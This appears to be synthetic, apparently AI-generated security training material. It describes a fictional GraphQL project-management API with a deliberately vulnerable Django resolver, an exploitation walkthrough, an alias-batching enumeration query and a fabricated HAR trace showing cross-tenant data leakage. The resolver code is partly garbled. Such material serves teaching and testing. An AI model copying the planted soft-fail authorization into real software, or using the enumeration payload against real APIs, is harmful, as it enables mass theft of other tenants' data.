@@ -1,0 +1,229 @@
+Here is the twenty-seventh system, continuing the focus on GraphQL vulnerabilities. We are entering the **SaaS / Project Management** sector, focusing on a **Project Task Management GraphQL API**.
+
+For the vulnerabilities, we are focusing on **Pattern 9.1 (GraphQL Alias Batching for Enumeration)** combined with **Pattern 1.8 (Predictable/Sequential IDs)**. This scenario demonstrates how GraphQL's native aliasing feature is abused to enumerate thousands of sequentially-ID'd, restricted project objects in a single HTTP request, leading to massive horizontal data leakage across user accounts (BOLA).
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** TaskFlow Project Management API
+**Document Version:** 6.0.0 (FINAL)
+**Classification:** CONFIDENTIAL / CORPORATE IP SCOPE
+**Domain:** SaaS / Project Management / Work Tracking
+
+## 1.0 Executive Summary
+TaskFlow is a multi-tenant project management platform used by hundreds of corporations to organize their engineering, marketing, and sales workflows. The core data model revolves around `Project` objects, which contain highly confidential competitive information.
+
+The platform exposes a GraphQL API to power its modern web and mobile applications. Due to the high volume of project creation, the backend has implemented simple sequential integer IDs for internal objects to improve database indexing performance, assuming the API's authentication layer would prevent enumeration.
+
+## 2.0 Comprehensive Network Topology & GraphQL Processing
+The architecture implements a standard, centralized GraphQL entry point.
+
+### 2.1 The Ingress Layer & GraphQL Router
+* **API Gateway (Node.js):** Handles all routing, ensuring all traffic goes to the single `/graphql` endpoint.
+* **Apollo Server (Schema Stitching):** The centralized hub that routes field requests to the appropriate microservices.
+
+### 2.2 The Backend Core Services
+* **Project Service (Python Django):** Utilizes a PostgreSQL database where the primary key for the `Project` object is an auto-incrementing integer (`project_id`).
+* **Authorization Middleware:** Custom middleware enforces that the authenticated user must be listed in the `Project.members` array before the resolver is executed.
+
+## 3.0 Identity, Sessions, and Object Authorization
+The security model relies on strict membership lists for project-level BOLA enforcement.
+
+### 3.1 User Authentication (JWT)
+Users authenticate via corporate SSO, and their session JWT contains the `user_id`.
+
+### 3.2 The BOLA Enforcement Flaw
+When a user attempts to query a project, the top-level `project(id: Int)` resolver is executed. The resolver is correctly configured to check the user's membership. However, if the query fails this check, it returns a soft `null` instead of a hard `403 Forbidden` error. This behavior allows attackers to probe for the existence of unauthorized projects without being blocked by API rate limiters on failed requests.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: We intentionally used simple sequential IDs (Pattern 1.8) for the Project table for historical reasons. The core authorization check returns a soft `null` on failure to prevent verbose error leakage (Pattern 6.2), but this inadvertently enables large-scale enumeration via GraphQL alias batching. Tracked as RISK-GRPH-903.*
+
+### 4.1 Vulnerability A: GraphQL Alias Enumeration on Sequential IDs (BOLA)
+**Taxonomy Pattern:** 9.1 (GraphQL Operations / Batching) & 1.8 (Predictable IDs)
+**Sub-system:** Project Service Resolver (`Query: project`)
+
+**The Deep Architectural Flaw:**
+This attack chains three vulnerabilities: predictable IDs, soft authorization failure, and GraphQL's batching capability.
+
+1. **Predictable IDs (Pattern 1.8):** The use of auto-incrementing integers (e.g., `10001`, `10002`, `10003`) makes the target space trivial to enumerate.
+
+2. **GraphQL Alias Batching (Pattern 9.1):** The attacker is authorized to send a single HTTP POST request to `/graphql`. They can leverage GraphQL aliasing to request thousands of sequentially numbered projects simultaneously in that single request (e.g., `p1: project(id: 10001)`, `p2: project(id: 10002)`, ... `p5000: project(id: 15000)`).
+
+3. **Soft Failure Evasion:** Because the resolver returns `null` for unauthorized projects and returns the Project object for authorized ones, the attacker only needs to scan the response JSON for non-`null` entries. This single request effectively allows the attacker to horizontally enumerate thousands of project details for which they were never authorized, fully bypassing rate limits enforced at the HTTP layer.
+
+**The Exploitation Path:**
+
+1. **The Foothold:** An attacker registers a standard user account (`user_attacker_1`) and obtains a valid JWT.
+2. **Discovery:** The attacker queries one of their own projects and notes the sequential ID (e.g., Project ID `12450`). They deduce the adjacent IDs will follow a predictable integer pattern.
+3. **The Enumeration Query:** The attacker crafts a single GraphQL query containing 2,000 aliases, ranging from Project ID `10000` to `12000`, requesting a sensitive field (e.g., `confidential_notes`).
+4. **The Execution:** The Apollo Server processes the single HTTP request, but the Project Service executes 2,000 internal database queries. Authorization checks are performed on all 2,000.
+5. **The Impact:** In the single response, the attacker identifies hundreds of projects belonging to other corporations. They extract confidential notes from those non-`null` entries, causing a massive cross-tenant data breach.
+
+***
+
+# TASKFLOW PROJECT API: SCHEMAS, VULNERABLE CODE, & GRAPHQL CONTRACTS
+**Document Version:** 4.1.0
+**Applies to Architecture:** TaskFlow Project Management API v6.0.0
+
+## 5.0 Project Ledger Schema (PostgreSQL)
+The database uses a simple auto-incrementing integer as the primary key, making the resource IDs highly guessable.
+
+```sql
+-- Core Project Table
+CREATE TABLE projects (
+project_id SERIAL PRIMARY KEY, -- VULNERABILITY 1.8: Predictable ID (e.g., 10001, 10002)
+tenant_id VARCHAR(50) NOT NULL, -- Logical isolation field
+project_name VARCHAR(100) NOT NULL,
+confidential_notes TEXT,
+is_active BOOLEAN DEFAULT TRUE,
+created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+);
+
+-- Membership Table (Used for authorization check)
+CREATE TABLE project_members (
+project_id INT REFERENCES projects(project_id),
+user_id VARCHAR(50) NOT NULL,
+role VARCHAR(20) CHECK (role IN ('MEMBER', 'ADMIN')),
+PRIMARY KEY (project_id, user_id)
+);
+```
+
+## 6.0 The Flawed Implementation (Python / Django GraphQL)
+The top-level resolver fails to enforce a "hard fail" on authorization, enabling enumeration. The architecture lacks depth limiting on the GraphQL document parser.
+
+### 6.1 Vulnerable Project Resolver
+```pythonFile: project_resolvers.py
+
+from django.db import connection
+
+def resolve_project(root, info, id):
+user_id = info.context.user.id
+# 1. Look up the project in the database  
+with connection.cursor() as cursor:  
+    cursor.execute("SELECT * FROM projects WHERE project\_id = %s", [id])  
+    project\_data = cursor.fetchone()  
+
+if not project\_data:  
+    return None  
+
+project = Project(project\_data)  
+
+# 2. Authorization Check (The Soft Failure)  
+is\_member = db.check\_membership(user\_id, id)  
+
+if not is\_member:  
+    # VULNERABILITY 9.1: The soft 'None' return value allows the attacker to efficiently check for the 
+    # existence of non-owned resources without triggering a hard 403 HTTP error/rate limit.
+    return None  
+
+return project 
+def resolve_projects(root, info, ids):
+# This bulk resolver is even more vulnerable, but the attacker can achieve the same result
+# using aliasing on the single-ID resolver.
+# ... implementation omitted ...
+```
+
+## 7.0 GraphQL API Contract (The Enumeration Attack)
+The attacker uses aliases in a single query to ask for 2000 sequentially numbered projects.
+
+### 7.1 Execute Alias Enumeration
+**Endpoint:** `POST /graphql`
+**Description:** Enumerates Project IDs from 10001 to 12000 in a single request.
+
+**Required Headers:**
+```http
+Authorization: Bearer <Attacker_User_JWT>
+Content-Type: application/json
+```
+
+**Malicious Request Payload (Truncated):**
+```graphql
+query MassProjectEnumeration {
+p10001: project(id: 10001) { projectName confidentialNotes }
+p10002: project(id: 10002) { projectName confidentialNotes }
+# ... (1998 more project queries follow) ...
+p12000: project(id: 12000) { projectName confidentialNotes }
+}
+```
+
+**Success Response (200 OK - Data Leak):**
+The response is a massive JSON object. The attacker only searches for key-value pairs where the value is not `null`.
+```json
+{
+"data": {
+"p10001": null,
+"p10002": null,
+"p10003": {
+"projectName": "Q3 Marketing Budget (Tenant B)",
+"confidentialNotes": "Need to secure $5M in funding before launch."
+},
+# ... (1995 more null/object entries follow) ...
+"p10155": null,
+"p10156": {
+"projectName": "Engineering Roadmap 2027",
+"confidentialNotes": "Pivot to Go-lang for performance critical services."
+}
+}
+}
+```
+
+***
+
+# SYNTHETIC ARTIFACT: GRAPHQL ALIAS ENUMERATION (HAR TRACE)
+**Applies to Architecture:** TaskFlow Project Management API v6.0.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 9.1 & Pattern 1.8)
+
+This HTTP Archive (HAR) trace captures the execution of the large-scale cross-tenant enumeration attack. The attacker submits a single HTTP POST request containing a GraphQL query with thousands of aliased fields (`p10001`, `p10002`, etc.), targeting sequential, guessable Project IDs.
+
+The single request bypasses the WAF's rate limit. The Apollo Server resolves all 2,000 sub-queries, and the soft authorization failure (`return None`) allows the non-owned results to return as `null`. The attacker successfully receives project data belonging to other tenants within the same response object, confirming the BOLA and enumeration vulnerability.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Apollo Server Logs / Django APM",
+"version": "6.0.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-10 T11:45:01.010Z",
+"time": 412,
+"request": {
+"method": "POST",
+"url": "https://api.taskflow.com/graphql",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.taskflow.com" },
+{ "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoidXNyX2F0dGFja2VyXzEifQ..." },
+{ "name": "content-type", "value": "application/json" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"query\": \"query MassProjectEnumeration { p10001: project(id: 10001) { projectName confidentialNotes } p10002: project(id: 10002) { projectName confidentialNotes } ... p12000: project(id: 12000) { projectName confidentialNotes } }\"}",
+"comment": "Payload containing 2,000 aliased fields. Actual bodySize was 128,400 bytes."
+},
+"bodySize": 128400
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-resolver-count", "value": "2000" }
+],
+"content": {
+"size": 74500,
+"mimeType": "application/json",
+"text": "{\"data\": {\"p10001\": null, \"p10002\": null, \"p10003\": {\"projectName\": \"Q3 Marketing Budget (Tenant B)\", \"confidentialNotes\": \"Need to secure $5M in funding before launch.\"}, \"p10004\": null, ... \"p10156\": {\"projectName\": \"Engineering Roadmap 2027\", \"confidentialNotes\": \"Pivot to Go-lang for performance critical services.\"}, ... \"p12000\": null}}"
+},
+"bodySize": 74500
+}
+}
+]
+}
+}
+```
+
+***
